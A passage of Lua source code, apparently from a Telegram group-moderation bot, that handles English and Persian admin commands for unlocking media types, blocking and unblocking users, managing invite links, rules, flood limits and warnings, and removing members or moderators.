          return "*Cmds is Already Unlocked For Members*"
        end
      elseif matches[2] == "all" or matches[2] == "\217\135\217\133\217\135" then
        unmute_item(msg, "all", "All", "\217\135\217\133\217\135", true)
      elseif matches[2] == "gif" or matches[2] == "\218\175\219\140\217\129" then
        unmute_item(msg, "gif", "Gif", "\218\175\219\140\217\129", true)
      elseif matches[2] == "text" or matches[2] == "\217\133\216\170\217\134" then
        unmute_item(msg, "text", "Text", "\217\133\216\170\217\134", false)
      elseif matches[2] == "photo" or matches[2] == "\216\185\218\169\216\179" then
        unmute_item(msg, "photo", "Photo", "\216\185\218\169\216\179", true)
      elseif matches[2] == "video" or matches[2] == "\217\129\219\140\217\132\217\133" then
        unmute_item(msg, "video", "Video", "\217\129\219\140\217\132\217\133", true)
      elseif matches[2] == "audio" or matches[2] == "\216\162\217\135\217\134\218\175" then
        unmute_item(msg, "audio", "Audio", "\216\162\217\135\217\134\218\175", true)
      elseif matches[2] == "voice" or matches[2] == "\216\181\216\175\216\167" or matches[2] == "\216\181\216\175\216\167" then
        unmute_item(msg, "voice", "Voice", "\216\181\216\175\216\167", true)
      elseif matches[2] == "sticker" or matches[2] == "\216\167\216\179\216\170\219\140\218\169\216\177" then
        unmute_item(msg, "sticker", "Sticker", "\216\167\216\179\216\170\219\140\218\169\216\177", true)
      elseif matches[2] == "contact" or matches[2] == "\217\133\216\174\216\167\216\183\216\168" then
        unmute_item(msg, "contact", "Contact", "\217\133\216\174\216\167\216\183\216\168", true)
      elseif matches[2] == "forward" or matches[2] == "\217\129\217\136\216\177\217\136\216\167\216\177\216\175" then
        unmute_item(msg, "forward", "Forward", "\217\129\217\136\216\177\217\136\216\167\216\177\216\175", true)
      elseif matches[2] == "location" or matches[2] == "\217\133\218\169\216\167\217\134" then
        unmute_item(msg, "location", "Location", "\217\133\218\169\216\167\217\134", true)
      elseif matches[2] == "document" or matches[2] == "\217\129\216\167\219\140\217\132" then
        unmute_item(msg, "document", "Document", "\217\129\216\167\219\140\217\132", true)
      elseif matches[2] == "tgservice" or matches[2] == "\216\174\216\175\217\133\216\167\216\170 \216\170\217\132\218\175\216\177\216\167\217\133" then
        unmute_item(msg, "tgservice", "Tgservice", "\216\174\216\175\217\133\216\167\216\170 \216\170\217\132\218\175\216\177\216\167\217\133", false)
      elseif matches[2] == "inline" or matches[2] == "\216\167\219\140\217\134\217\132\216\167\219\140\217\134" then
        unmute_item(msg, "inline", "Inline", "\216\167\219\140\217\134\217\132\216\167\219\140\217\134", true)
      elseif matches[2] == "game" or matches[2] == "\216\168\216\167\216\178\219\140" or matches[2] == "\216\168\216\167\216\178\219\140 \217\135\216\167\219\140 \216\162\217\134\217\132\216\167\219\140\217\134" then
        unmute_item(msg, "game", "Game", "\216\168\216\167\216\178\219\140 \217\135\216\167\219\140 \216\162\217\134\217\132\216\167\219\140\217\134", true)
      elseif matches[2] == "keyboard" or matches[2] == "\218\169\219\140\216\168\217\136\216\177\216\175" or matches[2] == "\216\181\217\129\216\173\217\135 \218\169\217\132\219\140\216\175" then
        unmute_item(msg, "keyboard", "Keyboard", "\218\169\219\140\216\168\217\136\216\177\216\175", true)
      else
        Locks = redis:smembers("GroupAddSettings:" .. msg.to.id)
        Items = redis:smembers("GroupAddSettingsItem:" .. msg.to.id .. ":" .. matches[2])
        if #Items ~= 0 and redis:sismember("GroupAddSettings:" .. msg.to.id, matches[2]) then
          if redis:get("AppliedAddSettings:" .. msg.to.id .. ":" .. matches[2]) then
            redis:del("AppliedAddSettings:" .. msg.to.id .. ":" .. matches[2])
            for k, v in pairs(Items) do
              redis:hdel("GroupSettings:" .. msg.to.id, v)
            end
            if not lang then
              return "*Private Lock:* `" .. matches[2] .. [[
` 
*Status:* `Disabled`]]
            else
              return "\217\130\217\129\217\132 \216\174\216\181\217\136\216\181\219\140: `" .. matches[2] .. "` \n\217\136\216\182\216\185\219\140\216\170: `\216\186\219\140\216\177 \217\129\216\185\216\167\217\132 \216\180\216\175`"
            end
          elseif not lang then
            return "*Private Lock:* `" .. matches[2] .. [[
` 
*Status:* `Already Disabled`]]
          else
            return "\217\130\217\129\217\132 \216\174\216\181\217\136\216\181\219\140: `" .. matches[2] .. "` \n\217\136\216\182\216\185\219\140\216\170: `\216\167\216\178 \217\130\216\168\217\132 \216\186\219\140\216\177 \217\129\216\185\216\167\217\132 \216\168\217\136\216\175`"
          end
        end
      end
    end
    if (matches[1]:lower() == "access" or matches[1] == "\216\175\216\179\216\170\216\177\216\179\219\140") and is_owner(msg) then
      if matches[2]:lower() == "owner" or matches[2] == "\216\181\216\167\216\173\216\168" then
        redis:set("GroupCmdsAccess:" .. msg.to.id, "owner")
        if lang then
          return "\216\175\216\179\216\170\216\177\216\179\219\140 \216\175\216\179\216\170\217\136\216\177\216\167\216\170 \216\168\217\135 `\216\181\216\167\216\173\216\168` \219\140\216\167 \216\168\216\167\217\132\216\167\216\170\216\177 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175"
        else
          return "*Commands Access Changed To* `owner` *or Higher*"
        end
      end
      if matches[2]:lower() == "moderator" or matches[2] == "\217\133\216\175\219\140\216\177" then
        redis:set("GroupCmdsAccess:" .. msg.to.id, "moderator")
        if lang then
          return "\216\175\216\179\216\170\216\177\216\179\219\140 \216\175\216\179\216\170\217\136\216\177\216\167\216\170 \216\168\217\135 `\217\133\216\175\219\140\216\177` \217\136 \216\168\216\167\217\132\216\167\216\170\216\177 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175"
        else
          return "*Commands Access Changed To* `moderator` *or Higher*"
        end
      end
      if matches[2]:lower() == "member" or matches[2] == "\217\133\217\133\216\168\216\177" then
        redis:del("GroupCmdsAccess:" .. msg.to.id)
        if lang then
          return "\216\175\216\179\216\170\216\177\216\179\219\140 \216\175\216\179\216\170\217\136\216\177\216\167\216\170 \216\168\216\177\216\167\219\140 `\217\135\217\133\217\135 \216\167\216\185\216\182\216\167` \216\162\216\178\216\167\216\175 \216\180\216\175"
        else
          return "*Commands Access Changed To* `member` *or Higher*"
        end
      end
    end
    if (matches[1]:lower() == "block" or matches[1] == "\217\133\216\179\216\175\217\136\216\175" or matches[1] == "\216\168\217\134") and is_mod(msg) then
      if not matches[2] and msg.reply_id then
        function BlockUser(extra, result, success)
          if result.sender_user_id_ then
            user = result.sender_user_id_
            chat = result.chat_id_
            if isModerator(chat, user) or user == bot.id then
              return NoAccess(chat)
            end
            kick_user(user, chat)
            if not redis:sismember("GroupRecentBlocked:" .. chat, user) then
              redis:sadd("GroupRecentBlocked:" .. chat, user)
            end
            return SendStatus(chat, user, "Blocked", "\217\133\216\179\216\175\217\136\216\175 \216\180\216\175")
          end
        end
        tdcli_function({
          ID = "GetMessage",
          chat_id_ = msg.to.id,
          message_id_ = msg.reply_to_message_id_
        }, BlockUser, nil)
      end
      if matches[2] and string.match(matches[2], "^%d+$") then
        local get = function(extra, result, success)
          chat = msg.to.id
          user = result.id_
          kick_user(user, chat)
          if isModerator(chat, user) or user == bot.id then
            return NoAccess(chat)
          end
          if not redis:sismember("GroupRecentBlocked:" .. chat, user) then
            redis:sadd("GroupRecentBlocked:" .. chat, user)
          end
          return SendStatus(chat, user, "Blocked", "\217\133\216\179\216\175\217\136\216\175 \216\180\216\175")
        end
        tdcli.getUser(matches[2], get)
      end
      if matches[2] and string.match(matches[2], "^@.*$") then
        function BlockUser(arg, data)
          if data.id_ then
            user = data.id_
            chat = arg.chat_id
            if isModerator(chat, user) or user == bot.id then
              return NoAccess(chat)
            end
            kick_user(user, chat)
            if not redis:sismember("GroupRecentBlocked:" .. chat, user) then
              redis:sadd("GroupRecentBlocked:" .. chat, user)
            end
            return SendStatus(chat, user, "Blocked", "\217\133\216\179\216\175\217\136\216\175 \216\180\216\175")
          end
        end
        tdcli_function({
          ID = "SearchPublicChat",
          username_ = matches[2]
        }, BlockUser, {
          chat_id = msg.to.id,
          username = matches[2]
        })
      end
    end
    if (matches[1]:lower() == "unblock" or matches[1]:lower() == "\216\162\216\178\216\167\216\175" or matches[1] == "\216\162\217\134\216\168\217\134") and is_mod(msg) then
      do
        local UnBlock = function(arg, data)
          tdcli.changeChatMemberStatus(arg.chat_id, arg.UserID, "Left", dl_cb, nil)
        end
        if matches[2] then
          if matches[2]:match("(%d+)") then
            local get = function(extra, result, success)
              chat = msg.to.id
              user = result.id_
              if isModerator(chat, user) or user == bot.id then
                return NoAccess(chat)
              end
              tdcli.getChannelMembers(msg.to.id, 0, "Kicked", 1, UnBlock, {
                chat_id = msg.to.id,
                UserID = tonumber(matches[2])
              })
              if redis:sismember("GroupRecentBlocked:" .. chat, user) then
                redis:srem("GroupRecentBlocked:" .. chat, user)
              end
              return SendStatus(msg.to.id, matches[2], "Unblocked", "\216\175\219\140\218\175\217\135 \217\133\216\179\216\175\217\136\216\175 \217\134\219\140\216\179\216\170!")
            end
            tdcli.getUser(matches[2], get)
          elseif matches[2]:match("^@") then
            local GetIDForUnblock = function(arg, data)
              if data.id_ then
                if isModerator(arg.chat_id, data.id_) or data.id_ == bot.id then
                  return NoAccess(arg.chat_id)
                end
                tdcli.getChannelMembers(arg.chat_id, 0, "Kicked", 1, UnBlock, {
                  chat_id = arg.chat_id,
                  UserID = data.id_
                })
                if redis:sismember("GroupRecentBlocked:" .. arg.chat_id, data.id_) then
                  redis:srem("GroupRecentBlocked:" .. arg.chat_id, data.id_)
                end
                return SendStatus(arg.chat_id, data.id_, "Unblocked", "\216\175\219\140\218\175\217\135 \217\133\216\179\216\175\217\136\216\175 \217\134\219\140\216\179\216\170!")
              end
            end
            tdcli_function({
              ID = "SearchPublicChat",
              username_ = matches[2]
            }, GetIDForUnblock, {
              chat_id = msg.to.id,
              msg_id = msg.id
            })
          end
        elseif not matches[2] and msg.reply_id then
          function GetIDForUnblock(extra, result, success)
            if result.sender_user_id_ then
              user = result.sender_user_id_
              chat = result.chat_id_
              if isModerator(chat, user) or user == bot.id then
                return NoAccess(chat)
              end
              tdcli.getChannelMembers(chat, 0, "Kicked", 1, UnBlock, {chat_id = chat, UserID = user})
              if redis:sismember("GroupRecentBlocked:" .. chat, user) then
                redis:srem("GroupRecentBlocked:" .. chat, user)
              end
              return SendStatus(chat, user, "Unblocked", "\216\175\219\140\218\175\217\135 \217\133\216\179\216\175\217\136\216\175 \217\134\219\140\216\179\216\170!")
            end
          end
          tdcli_function({
            ID = "GetMessage",
            chat_id_ = msg.to.id,
            message_id_ = msg.reply_to_message_id_
          }, GetIDForUnblock, nil)
        end
      end
    else
    end
    if (matches[1]:lower() == "blocklist" or matches[1] == "\217\132\219\140\216\179\216\170 \217\133\216\179\216\175\217\136\216\175") and is_mod(msg) then
      String = redis:smembers("GroupRecentBlocked:" .. msg.to.id)
      if #String == 0 then
        if not lang then
          return "Recent Blocked Users List is Empty"
        else
          return "\217\132\219\140\216\179\216\170 \218\169\216\167\216\177\216\168\216\177\216\167\217\134 \217\133\216\179\216\175\217\136\216\175 \216\180\216\175\217\135 \216\167\216\174\219\140\216\177 \216\174\216\167\217\132\219\140 \217\133\219\140 \216\168\216\167\216\180\216\175"
        end
      else
        if not lang then
          text = [[
*Recent Blocked Users:*

]]
        else
          text = "`\218\169\216\167\216\177\216\168\216\177\216\167\217\134 \217\133\216\179\216\175\217\136\216\175 \216\180\216\175\217\135 \216\167\216\174\219\140\216\177:`\n\n"
        end
        for k, v in pairs(String) do
          if k <= 20 then
            text = text .. k .. "- " .. v .. "\n"
          elseif k >= 20 then
            redis:srem("GroupRecentBlocked:" .. msg.to.id, v)
          end
        end
        return text
      end
    end
    if (matches[1]:lower() == "newlink" or matches[1] == "\217\132\219\140\217\134\218\169 \216\172\216\175\219\140\216\175") and is_mod(msg) and not matches[2] then
      local callback_link = function(arg, data)
        local hash = "gp_lang:" .. msg.to.id
        local lang = redis:get(hash)
        if not data.invite_link_ then
          if not lang then
            return tdcli.sendMessage(msg.to.id, msg.id, 1, "*Error!* Please Set Link With `/setlink`", 1, "md")
          elseif lang then
            return tdcli.sendMessage(msg.to.id, msg.id, 1, "\216\174\216\183\216\167! \217\132\216\183\217\129\216\167 \217\132\219\140\217\134\218\169 \216\177\216\167 \216\168\216\167 \216\175\216\179\216\170\217\136\216\177 `/setlink` \216\170\217\134\216\184\219\140\217\133 \218\169\217\134\219\140\216\175", 1, "md")
          end
        else
          redis:hset("GroupSettings:" .. msg.to.id, "GroupLink", data.invite_link_)
          if not lang then
            return tdcli.sendMessage(msg.to.id, msg.id, 1, "`New Link Created`", 1, "md")
          elseif lang then
            return tdcli.sendMessage(msg.to.id, msg.id, 1, "`\217\132\219\140\217\134\218\169 \216\172\216\175\219\140\216\175 \216\179\216\167\216\174\216\170\217\135 \216\180\216\175`", 1, "md")
          end
        end
      end
      tdcli.exportChatInviteLink(msg.to.id, callback_link, nil)
    end
    if (matches[1]:lower() == "newlink" or matches[1] == "\217\132\219\140\217\134\218\169 \216\172\216\175\219\140\216\175") and is_mod(msg) and matches[2] == "pv" then
      local callback_link = function(arg, data)
        local result = data.invite_link_
        local hash = "gp_lang:" .. msg.to.id
        local lang = redis:get(hash)
        if not result then
          if not lang then
            return tdcli.sendMessage(msg.to.id, msg.id, 1, "*Error!* Please Set Link With `/setlink`", 1, "md")
          elseif lang then
            return tdcli.sendMessage(msg.to.id, msg.id, 1, "\216\174\216\183\216\167! \217\132\216\183\217\129\216\167 \217\132\219\140\217\134\218\169 \216\177\216\167 \216\168\216\167 \216\175\216\179\216\170\217\136\216\177 `/setlink` \216\170\217\134\216\184\219\140\217\133 \218\169\217\134\219\140\216\175", 1, "md")
          end
        else
          redis:hset("GroupSettings:" .. msg.to.id, "GroupLink", result)
          if not lang then
            tdcli.sendMessage(user, msg.id, 1, "New Link `" .. msg.to.id .. [[
`
> ]] .. result, 1, "md")
          elseif lang then
            tdcli.sendMessage(user, msg.id, 1, "\217\132\219\140\217\134\218\169 \216\172\216\175\219\140\216\175 \218\175\216\177\217\136\217\135 `" .. msg.to.id .. [[
`
> ]] .. result, 1, "md")
          end
        end
      end
      tdcli.exportChatInviteLink(msg.to.id, callback_link, nil)
    end
    if (matches[1]:lower() == "setlink" or matches[1] == "\216\170\217\134\216\184\219\140\217\133 \217\132\219\140\217\134\218\169") and is_owner(msg) then
      if not matches[2] then
        redis:hset("GroupSettings:" .. msg.to.id, "GroupLink", "waiting")
        if not lang then
          return "`Please Send Link:`"
        else
          return "`\217\132\216\183\217\129\216\167 \217\132\219\140\217\134\218\169 \216\177\216\167 \216\167\216\177\216\179\216\167\217\132 \218\169\217\134\219\140\216\175:`"
        end
      end
      redis:hset("GroupSettings:" .. msg.to.id, "GroupLink", matches[2])
      if not lang then
        return "`Link Saved!`"
      else
        return "`\217\132\219\140\217\134\218\169 \216\176\216\174\219\140\216\177\217\135 \216\180\216\175!`"
      end
    end
    if msg.text then
      local is_link = msg.text:match("^([https?://w]*.?telegram.me/joinchat/%S+)$") or msg.text:match("^([https?://w]*.?t.me/joinchat/%S+)$")
      if is_link and redis:hget("GroupSettings:" .. msg.to.id, "GroupLink") == "waiting" and is_owner(msg) then
        redis:hset("GroupSettings:" .. msg.to.id, "GroupLink", msg.text)
        if not lang then
          return "`Link Saved!`"
        else
          return "`\217\132\219\140\217\134\218\169 \216\176\216\174\219\140\216\177\217\135 \216\180\216\175!`"
        end
      end
    end
    if (matches[1]:lower() == "link" or matches[1] == "\217\132\219\140\217\134\218\169 \218\175\216\177\217\136\217\135") and is_mod(msg) and not matches[2] then
      local linkgp = redis:hget("GroupSettings:" .. msg.to.id, "GroupLink")
      if not linkgp then
        if not lang then
          return "Please Set Group Link With `/setlink` or Create New Link With `/newlink`"
        else
          return "\217\132\216\183\217\129\216\167 \216\168\216\167 \216\175\216\179\216\170\217\136\216\177 `/setlink` \217\132\219\140\217\134\218\169 \218\175\216\177\217\136\217\135 \216\177\216\167 \216\170\217\134\216\184\219\140\217\133 \218\169\217\134\219\140\216\175 \219\140\216\167 \216\168\216\167 \216\175\216\179\216\170\217\136\216\177 `/newlink` \217\132\219\140\217\134\218\169 \216\172\216\175\219\140\216\175\219\140 \216\167\219\140\216\172\216\167\216\175 \218\169\217\134\219\140\216\175"
        end
      end
      if not lang then
        text = "<code>Group Link :</code>\n" .. linkgp
      else
        text = "<code>\217\132\219\140\217\134\218\169 \218\175\216\177\217\136\217\135 :</code>\n" .. linkgp
      end
      return tdcli.sendMessage(chat, msg.id, 1, text, 1, "html")
    end
    if (matches[1]:lower() == "link" or matches[1] == "\217\132\219\140\217\134\218\169 \218\175\216\177\217\136\217\135") and (matches[2] == "pv" or matches[2] == "\217\190\219\140\217\136\219\140") and is_mod(msg) then
      local linkgp = redis:hget("GroupSettings:" .. msg.to.id, "GroupLink")
      if not linkgp then
        if not lang then
          return "Please Set Group Link With `/setlink` or Create New Link With `/newlink`"
        else
          return "\217\132\216\183\217\129\216\167 \216\168\216\167 \216\175\216\179\216\170\217\136\216\177 `/setlink` \217\132\219\140\217\134\218\169 \218\175\216\177\217\136\217\135 \216\177\216\167 \216\170\217\134\216\184\219\140\217\133 \218\169\217\134\219\140\216\175 \219\140\216\167 \216\168\216\167 \216\175\216\179\216\170\217\136\216\177 `/newlink` \217\132\219\140\217\134\218\169 \216\172\216\175\219\140\216\175\219\140 \216\167\219\140\216\172\216\167\216\175 \218\169\217\134\219\140\216\175"
        end
      end
      if not lang then
        tdcli.sendMessage(chat, "", 1, "<b>Link Group has been sended your pv</b>", 1, "html")
        tdcli.sendMessage(user, "", 1, "<b>Group Link " .. msg.to.title .. " :</b>\n" .. linkgp, 1, "html")
      else
        tdcli.sendMessage(chat, "", 1, "<b>\217\132\219\140\217\134\218\169 \218\175\216\177\217\136\217\135 \216\175\216\177 \217\190\219\140\217\136\219\140  \216\180\217\133\216\167 \216\167\216\177\216\179\216\167\217\132 \216\180\216\175</b>", 1, "html")
        tdcli.sendMessage(user, "", 1, "<b>\217\132\219\140\217\134\218\169 \218\175\216\177\217\136\217\135 " .. msg.to.title .. " :</b>\n" .. linkgp, 1, "html")
      end
      if not lang then
        return "Link Was Send Your Pv"
      else
        return "\217\132\219\140\217\134\218\169 \216\168\217\135 \217\190\219\140\217\136\219\140 \216\180\217\133\216\167 \216\167\216\177\216\179\216\167\217\132 \216\180\216\175"
      end
    end
    if (matches[1]:lower() == "setrules" or matches[1] == "\216\170\217\134\216\184\219\140\217\133 \217\130\217\136\216\167\217\134\219\140\217\134") and matches[2] and is_mod(msg) then
      redis:hset("GroupSettings:" .. msg.to.id, "rules", matches[2])
      if not lang then
        return "*Group Rules Changed To:*\n" .. matches[2]
      else
        return "\217\130\217\136\216\167\217\134\219\140\217\134 \218\175\216\177\217\136\217\135 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175 \216\168\217\135:\n" .. matches[2]
      end
    end
    if (matches[1]:lower() == "setrules" or matches[1] == "\216\170\217\134\216\184\219\140\217\133 \217\130\217\136\216\167\217\134\219\140\217\134") and not matches[2] and is_mod(msg) then
      redis:setex("WaitForSetRules:" .. msg.to.id .. ":" .. msg.from.id, 300, true)
      if not lang then
        return "*Now Send Rules For Set:* (Cancel With `cancel`)"
      else
        return "\217\130\217\136\216\167\217\134\219\140\217\134 \218\175\216\177\217\136\217\135 \216\177\216\167 \216\168\216\177\216\167\219\140 \216\170\217\134\216\184\219\140\217\133 \218\169\216\177\216\175\217\134 \216\167\216\177\216\179\216\167\217\132 \218\169\217\134\219\140\216\175: (\217\132\216\186\217\136 \216\168\216\167 `cancel`)"
      end
    end
    if matches[1]:lower() == "rules" or matches[1] == "\217\130\217\136\216\167\217\134\219\140\217\134" then
      if not redis:hget("GroupSettings:" .. msg.to.id, "rules") then
        if not lang then
          rules = [[
Rules:
*1-*`Do not spam`
*2-*`Do not use filtered words`
*3-*`Do not send +18 photos`]]
        elseif lang then
          rules = "\217\130\217\136\216\167\217\134\219\140\217\134:\n*1-*`\216\167\216\179\217\190\217\133 \217\134\218\169\217\134\219\140\216\175`\n*2-*`\216\167\216\178 \218\169\217\132\217\133\216\167\216\170 \217\129\219\140\217\132\216\170\216\177 \216\180\216\175\217\135 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \217\134\218\169\217\134\219\140\216\175`\n*3-*`\216\185\218\169\216\179 \217\135\216\167\219\140 +18 \216\167\216\177\216\179\216\167\217\132 \217\134\218\169\217\134\219\140\216\175`"
        end
      elseif not lang then
        rules = "Rules:\n" .. redis:hget("GroupSettings:" .. msg.to.id, "rules")
      else
        rules = "\217\130\217\136\216\167\217\134\219\140\217\134:\n" .. redis:hget("GroupSettings:" .. msg.to.id, "rules")
      end
      return rules
    end
    if (matches[1]:lower() == "res" or matches[1] == "\216\167\216\183\217\132\216\167\216\185\216\167\216\170") and matches[2] and is_mod(msg) then
      tdcli_function({
        ID = "SearchPublicChat",
        username_ = matches[2]
      }, action_by_username, {
        chat_id = msg.to.id,
        username = matches[2],
        cmd = "res"
      })
    end
    if (matches[1]:lower() == "setchannel" or matches[1] == "\216\170\217\134\216\184\219\140\217\133 \218\169\216\167\217\134\216\167\217\132") and is_owner(msg) then
      if matches[2]:match("^(@.*)$") then
        redis:hset("GroupSettings:" .. msg.to.id, "group_channel", matches[2])
        redis:set("WaitForSetChannel:" .. msg.to.id .. ":" .. msg.from.id, true)
        if not lang then
          return [[
*Channel Saved!*
Now Create Bot With @botfather And Send Bot Token:
If You Wish, You Can Use The our Helper Bot ( @]] .. UseMark(_config.Helper) .. " ) By Entering `skip`"
        else
          return "\218\169\216\167\217\134\216\167\217\132 \216\176\216\174\219\140\216\177\217\135 \216\180\216\175!\n\217\135\217\133 \216\167\218\169\217\134\217\136\217\134 \216\168\216\167 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \216\167\216\178 @botfather \216\177\216\168\216\167\216\170\219\140 \216\168\216\179\216\167\216\178\219\140\216\175 \217\136 \216\170\217\136\218\169\217\134 \216\162\217\134 \216\177\216\167 \216\167\216\177\216\179\216\167\217\132 \217\134\217\133\216\167\219\140\219\140\216\175:\n\216\175\216\177 \216\181\217\136\216\177\216\170 \216\170\217\133\216\167\219\140\217\132 \217\133\219\140 \216\170\217\136\216\167\217\134\219\140\216\175 \216\168\216\167 \217\136\216\167\216\177\216\175 \218\169\216\177\216\175\217\134 `skip` \216\167\216\178 \216\177\216\168\216\167\216\170 \218\169\217\133\218\169\219\140 \217\133\216\167 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175 ( @" .. UseMark(_config.Helper) .. " )"
        end
      elseif matches[2]:lower() == "off" or matches[2] == "\216\174\216\167\217\133\217\136\216\180" then
        redis:hdel("GroupSettings:" .. msg.to.id, "group_channel")
        redis:hdel("GroupSettings:" .. msg.to.id, "group_helper")
        if not lang then
          return "Forced Join in Channel Has Been Disabled"
        else
          return "\216\185\216\182\217\136\219\140\216\170 \216\167\216\172\216\168\216\167\216\177\219\140 \216\175\216\177 \218\169\216\167\217\134\216\167\217\132 \216\174\216\167\217\133\217\136\216\180 \216\180\216\175"
        end
      end
    end
    if (matches[1]:lower() == "setflood" or matches[1] == "\216\170\217\134\216\184\219\140\217\133 \216\173\216\179\216\167\216\179\219\140\216\170 \217\190\219\140\216\167\217\133 \216\177\218\175\216\168\216\167\216\177\219\140") and is_mod(msg) then
      if 1 > tonumber(matches[2]) or tonumber(matches[2]) > 200 then
        if not lang then
          return "*Please enter a number between* `1` *and* `200`"
        else
          return "\217\132\216\183\217\129\216\167 \219\140\218\169 \216\180\217\133\216\167\216\177\217\135 \216\168\219\140\217\134 `1` \216\170\216\167 `200` \217\136\216\167\216\177\216\175 \218\169\217\134\219\140\216\175"
        end
      end
      local flood_max = matches[2]
      redis:hset("GroupSettings:" .. msg.to.id, "num_msg_max", flood_max)
      if not lang then
        return "*Group flood sensitivity has been set to:* [`" .. matches[2] .. "`]"
      else
        return "\216\173\216\179\216\167\216\179\219\140\216\170 \217\190\219\140\216\167\217\133 \216\177\218\175\216\168\216\167\216\177\219\140 \218\175\216\177\217\136\217\135 \216\170\217\134\216\184\219\140\217\133 \216\180\216\175 \216\168\217\135: [`" .. matches[2] .. "`]"
      end
    end
    if (matches[1]:lower() == "setfloodtime" or matches[1] == "\216\170\217\134\216\184\219\140\217\133 \216\178\217\133\216\167\217\134 \217\190\219\140\216\167\217\133 \216\177\218\175\216\168\216\167\216\177\219\140") and is_mod(msg) then
      if tonumber(matches[2]) < 6 then
        if not lang then
          return "*Please Enter a number bigger than* `5`"
        else
          return "\217\132\216\183\217\129\216\167 \219\140\218\169 \216\180\217\133\216\167\216\177\217\135 \216\168\216\178\216\177\218\175\216\170\216\177 \216\167\216\178 5 \217\136\216\167\216\177\216\175 \218\169\217\134\219\140\216\175"
        end
      elseif tonumber(matches[2]) >= 6 then
        redis:hset("GroupSettings:" .. msg.to.id, "FloodTime", tonumber(matches[2]))
        if not lang then
          return "*Flood Time has been changed to:* `" .. matches[2] .. "`"
        else
          return "\216\178\217\133\216\167\217\134 \217\190\219\140\216\167\217\133 \216\177\218\175\216\168\216\167\216\177\219\140 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175 \216\168\217\135: `" .. matches[2] .. "`"
        end
      end
    end
    if (matches[1]:lower() == "setmaxwords" or matches[1] == "\216\170\217\134\216\184\219\140\217\133 \216\173\216\175\216\167\218\169\216\171\216\177 \218\169\217\132\217\133\216\167\216\170") and is_mod(msg) then
      if tonumber(matches[2]) < 10 then
        if not lang then
          return "*Please enter a number bigger than* `10`"
        else
          return "\217\132\216\183\217\129\216\167 \219\140\218\169 \216\185\216\175\216\175 \216\168\216\178\216\177\218\175\216\170\216\177 \216\167\216\178 `10` \217\136\216\167\216\177\216\175 \218\169\217\134\219\140\216\175"
        end
      elseif tonumber(matches[2]) >= 10 then
        redis:hset("GroupSettings:" .. msg.to.id, "MaxWords", tonumber(matches[2]))
        if not lang then
          return "*Group max words has been set to:* [`" .. matches[2] .. "`]"
        else
          return "\216\173\216\175\216\167\218\169\216\171\216\177 \218\169\217\132\217\133\216\167\216\170 \216\175\216\177 \217\190\219\140\216\167\217\133 \217\135\216\167\219\140 \218\175\216\177\217\136\217\135 \216\170\217\134\216\184\219\140\217\133 \216\180\216\175 \216\168\217\135: [`" .. matches[2] .. "`]"
        end
      end
    end
    if (matches[1]:lower() == "setmaxwarn" or matches[1] == "\216\170\217\134\216\184\219\140\217\133 \216\173\216\175\216\167\218\169\216\171\216\177 \216\167\216\174\216\183\216\167\216\177") and is_owner(msg) then
      if 2 > tonumber(matches[2]) then
        if not lang then
          return "Please enter a number bigger than `1`"
        else
          return "\217\132\216\183\217\129\216\167 \216\180\217\133\216\167\216\177\217\135 \216\167\219\140 \216\168\216\178\216\177\218\175\216\170\216\177 \216\167\216\178 `1` \217\136\216\167\216\177\216\175 \218\169\217\134\219\140\216\175"
        end
      elseif 2 <= tonumber(matches[2]) then
        redis:hset("GroupSettings:" .. msg.to.id, "MaxWarn", tonumber(matches[2]))
        if not lang then
          return "Max warn changed to `" .. matches[2] .. "`"
        else
          return "\216\173\216\175\216\167\218\169\216\171\216\177 \216\167\216\174\216\183\216\167\216\177 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175 \216\168\217\135 `" .. matches[2] .. "`"
        end
      end
    end
    if (matches[1]:lower() == "invitekicked" or matches[1] == "\216\175\216\185\217\136\216\170 \216\167\216\174\216\177\216\167\216\172 \216\180\216\175\217\135 \217\135\216\167") and is_owner(msg) and gp_type(msg.to.id) == "channel" then
      tdcli.getChannelMembers(msg.to.id, 0, "Kicked", 200, function(i, gp)
        for k, v in pairs(gp.members_) do
          tdcli.addChatMember(i.chat_id, v.user_id_, 50, dl_cb, nil)
        end
      end, {
        chat_id = msg.to.id
      })
      if not lang then
        return "*Kicked Members has been invited!*"
      else
        return "\216\167\216\185\216\182\216\167 \216\167\216\174\216\177\216\167\216\172 \216\180\216\175\217\135 \216\168\217\135 \218\175\216\177\217\136\217\135 \216\175\216\185\217\136\216\170 \216\180\216\175\217\134\216\175!"
      end
    end
    if (matches[1]:lower() == "clean" or matches[1] == "\217\190\216\167\218\169\216\179\216\167\216\178\219\140") and is_owner(msg) then
      if matches[2] == "members" or matches[2] == "\216\167\216\185\216\182\216\167" then
        redis:setex("WaitForCleanMembers:" .. msg.from.id .. ":" .. msg.to.id, 300, true)
        if not lang then
          return [[
Warning!
With This Commands All Members in This Group Will Be Removed (`1` To Confirm And `0` To Cancel)]]
        else
          return "\216\167\216\174\216\183\216\167\216\177!\n\216\168\216\167 \216\167\219\140\217\134 \216\175\216\179\216\170\217\136\216\177 \216\170\217\133\216\167\217\133\219\140 \216\167\216\185\216\182\216\167 \218\175\216\177\217\136\217\135 \216\167\216\174\216\177\216\167\216\172 \216\174\217\136\216\167\217\135\217\134\216\175 \216\180\216\175 (`1` \216\168\216\177\216\167\219\140 \216\170\216\167\219\140\219\140\216\175 \217\136 `0` \216\168\216\177\216\167\219\140 \217\132\216\186\217\136)"
        end
      end
      if matches[2] == "mods" or matches[2] == "\217\133\216\175\219\140\216\177\216\167\217\134" then
        if next(data[tostring(chat)].mods) == nil then
          if not lang then
            return "*No moderators in this group*"
          else
            return "\217\133\216\175\219\140\216\177\219\140 \216\175\216\177 \218\175\216\177\217\136\217\135 \217\134\219\140\216\179\216\170"
          end
        end
        for k, v in pairs(data[tostring(chat)].mods) do
          data[tostring(chat)].mods[tostring(k)] = nil
          save_data("./data/moderation.json", data)
        end
        if not lang then
          return "*All moderators has been demoted*"
        else
          return "\216\170\217\133\216\167\217\133 \217\133\216\175\219\140\216\177\216\167\217\134 \218\175\216\177\217\136\217\135 \216\168\216\177\218\169\217\134\216\167\216\177 \216\180\216\175\217\134\216\175"
        end
